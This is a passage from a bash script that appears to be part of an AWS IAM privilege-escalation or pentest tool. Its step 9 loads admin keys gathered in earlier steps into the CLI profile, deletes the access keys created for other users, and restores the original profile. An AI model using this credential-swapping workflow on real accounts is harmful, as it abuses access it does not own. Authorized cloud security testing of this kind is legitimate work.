printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 9. Cleanup created access keys (admin-assisted) ===" "${RESET}"

# Sanity checks
if [ "${#SUCCESS_USERS[@]}" -eq 0 ]; then
  info "No created keys recorded; nothing to clean."
fi
if [ "${#ADMIN_USERS[@]}" -eq 0 ]; then
  err "No admin user detected in Step 8; cannot perform cleanup."
  return 0 2>/dev/null || exit 0
fi

# Choose admin principal (first detected)
ADMIN_PRINCIPAL="${ADMIN_USERS[0]}"
ADMIN_K="${ADMIN_KEYS[$ADMIN_PRINCIPAL]}"
ADMIN_S="${ADMIN_SECRETS[$ADMIN_PRINCIPAL]}"

if [ -z "$ADMIN_K" ] || [ -z "$ADMIN_S" ]; then
  err "Admin credentials not available for ${ADMIN_PRINCIPAL}; cannot perform cleanup."
  return 1 2>/dev/null || exit 1
fi

step "Using admin credentials for cleanup: ${YELLOW}${ADMIN_PRINCIPAL}${RESET}"

# Save current profile creds, then switch to admin
SAV_KEY="$(aws configure get aws_access_key_id --profile "$PROFILE" 2>/dev/null || true)"
SAV_SEC="$(aws configure get aws_secret_access_key --profile "$PROFILE" 2>/dev/null || true)"

aws configure set aws_access_key_id     "$ADMIN_K" --profile "$PROFILE"
aws configure set aws_secret_access_key "$ADMIN_S" --profile "$PROFILE"

# Verify admin identity
ADMIN_ARN="$(aws sts get-caller-identity --profile "$PROFILE" --query 'Arn' --output text 2>/dev/null || echo '')"
if [ -n "$ADMIN_ARN" ]; then
  ok "Assumed admin identity: ${ADMIN_ARN}"
else
  err "Failed to assume admin credentials; cleanup aborted."
  # Attempt to restore creds anyway
  if [ -n "$SAV_KEY" ] && [ -n "$SAV_SEC" ]; then
    aws configure set aws_access_key_id     "$SAV_KEY" --profile "$PROFILE"
    aws configure set aws_secret_access_key "$SAV_SEC" --profile "$PROFILE"
  fi
  return 1 2>/dev/null || exit 1
fi

# Helper: delete with small retry loop for eventual consistency
delete_key() {
  local user="$1" keyid="$2"
  local tries=0 rc=1 errout
  while [ $tries -lt 3 ]; do
    set +e
    errout="$(aws iam delete-access-key --user-name "$user" --access-key-id "$keyid" --profile "$PROFILE" 2>&1)"
    rc=$?
    set -e
    if [ $rc -eq 0 ]; then
      printf "[OK] Deleted AccessKey for %s (%s)\n" "$user" "$keyid"
      return 0
    fi
    tries=$((tries+1))
    sleep 2
  done
  printf "[DENY] Failed to delete AccessKey for %s (%s)\n" "$user" "$keyid"
  [ -n "$errout" ] && printf "       Error: %s\n" "$errout"
  return 1
}

# Build deletion order: non-admin first, admin last (if we created a key for admin)
DELETE_ORDER=()
for u in "${SUCCESS_USERS[@]}"; do
  if [ "$u" != "$ADMIN_PRINCIPAL" ]; then
    DELETE_ORDER+=("$u")
  fi
done
if [ -n "${SG_KEYS[$ADMIN_PRINCIPAL]:-}" ]; then
  DELETE_ORDER+=("$ADMIN_PRINCIPAL")
fi

# Execute deletions
if [ "${#DELETE_ORDER[@]}" -gt 0 ]; then
  printf "%s[*]%s Deleting created AccessKeys (non-admin first, admin last):\n" "${YELLOW}" "${RESET}"
  for u in "${DELETE_ORDER[@]}"; do
    kid="${SG_KEYS[$u]}"
    if [ -n "$kid" ]; then
      delete_key "$u" "$kid"
    else
      printf "[i] No key recorded for %s; skipping\n" "$u"
    fi
  done
else
  info "No keys recorded for deletion."
fi

# Restore original profile creds
step "Restoring original profile credentials"
if [ -n "$SAV_KEY" ] && [ -n "$SAV_SEC" ]; then
  aws configure set aws_access_key_id     "$SAV_KEY" --profile "$PROFILE"
  aws configure set aws_secret_access_key "$SAV_SEC" --profile "$PROFILE"
  ok "Profile ${PROFILE} restored"
else
  info "Original creds not found; profile remains on admin creds."
fi
